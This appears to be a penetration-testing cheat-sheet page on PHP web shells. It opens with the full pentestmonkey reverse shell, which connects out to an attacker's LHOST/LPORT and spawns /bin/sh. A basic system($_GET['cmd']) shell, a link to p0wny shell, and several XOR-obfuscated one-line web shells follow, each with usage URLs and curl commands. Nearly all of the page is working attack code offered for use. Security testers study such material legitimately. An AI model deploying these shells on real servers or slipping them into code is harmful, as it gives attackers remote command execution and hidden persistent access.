---
description: >-
  Attackers who successfully exploit a remote command execution vulnerability
  can use a reverse shell to obtain an interactive shell session on the target
  machine and continue their attack.
---

# PHP Reverse Shell

### Pentestmonkey's Reverse Shell

{% code title="shell.php" overflow="wrap" %}
```php

  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = 'LHOST';  // <==
  $port = LPORT;  // <==
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?> 
  
```
{% endcode %}

### Basic RCE

When you have successfully uploaded your payload, just put your commands after the variable `?cmd=` (ex: `?cmd=ls -la"`)

```php
<?php system($_GET["cmd"]);?>
```

### P0wny Shell

`p0wny@shell:~#` is a very basic, single-file, PHP shell. It can be used to quickly execute commands on a server when pentesting a PHP application.

[**REPO**](https://github.com/flozz/p0wny-shell) **|** [**SCRIPT**](https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php)

### Obfuscated PHP Web Shells

{% code fullWidth="false" %}
```php
<?=`$_GET[0]`?>
```
{% endcode %}

**Usage**: http://target.com/path/to/shell.php?0=`command`

***

```php
<?=`$_POST[0]`?>
```

**Usage**: `curl -X POST http://target.com/path/to/shell.php -d "0=command"`

***

```php
<?=`{$_REQUEST['_']}`?>
```

**Usage**:

* http://target.com/path/to/shell.php?\_=`command`
* `curl -X POST http://target.com/path/to/shell.php -d "_=command" '`

***

```
<?=$_="";$_="'" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
```

**Usage**: http://target.com/path/to/shell.php?0=`command`

***

```
<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
```

**Usage**:

* http://target.com/path/to/shell.php?\_=function&\_\_=argument
* http://target.com/path/to/shell.php?\_=system&\_\_=ls
